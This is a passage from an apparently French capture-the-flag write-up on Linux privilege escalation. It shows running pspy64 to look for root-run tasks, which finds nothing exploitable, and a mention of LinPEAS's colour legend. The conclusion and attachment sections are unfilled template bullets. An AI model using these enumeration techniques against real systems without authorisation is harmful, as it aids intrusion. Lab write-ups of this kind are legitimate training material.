./pspy64

L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.

Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.

### Conclusion de l’énumération manuelle

### Analyse avec linpeas.sh
Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)

---

## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
- Arbo conseillée : `files/<nom_ctf>/…`

{{< feedback >}}